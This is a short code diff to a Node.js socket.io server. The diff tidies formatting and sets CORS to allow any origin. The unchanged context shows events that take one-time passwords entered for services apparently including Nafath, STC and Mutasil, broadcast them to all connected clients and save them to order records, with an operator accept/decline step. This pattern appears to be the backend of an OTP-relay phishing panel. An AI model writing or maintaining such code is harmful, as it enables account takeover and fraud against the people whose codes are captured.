@@ -8,7 +8,7 @@ const server = require("http").createServer(app);
 const PORT = process.env.PORT || 8080;
 const io = require("socket.io")(server, { cors: { origin: "*" } });
 app.use(express.json());
-app.use(cors());
+app.use(cors({ origin: "*" }));
 app.use(require("morgan")("dev"));
 
 const emailData = {
@@ -377,8 +377,8 @@ io.on("connection", (socket) => {
     io.emit("motslOtp", data);
   });
   socket.on("acceptMotslOtp", async ({ id, userOtp }) => {
-    console.log("acceptMotslOtp send", {id,userOtp});
-    io.emit("acceptMotslOtp", {id,userOtp});
+    console.log("acceptMotslOtp send", { id, userOtp });
+    io.emit("acceptMotslOtp", { id, userOtp });
     await Order.findByIdAndUpdate(id, {
       NavazOtp: userOtp,
     });
@@ -391,7 +391,7 @@ io.on("connection", (socket) => {
 
   socket.on("acceptSTC", async ({ id, userOtp }) => {
     console.log("acceptSTC send", { id, userOtp });
-    io.emit("acceptSTC", { userOtp ,id});
+    io.emit("acceptSTC", { userOtp, id });
     await Order.findByIdAndUpdate(id, { NavazOtp: userOtp, STCAccept: true });
   });
   socket.on("declineSTC", async (id) => {
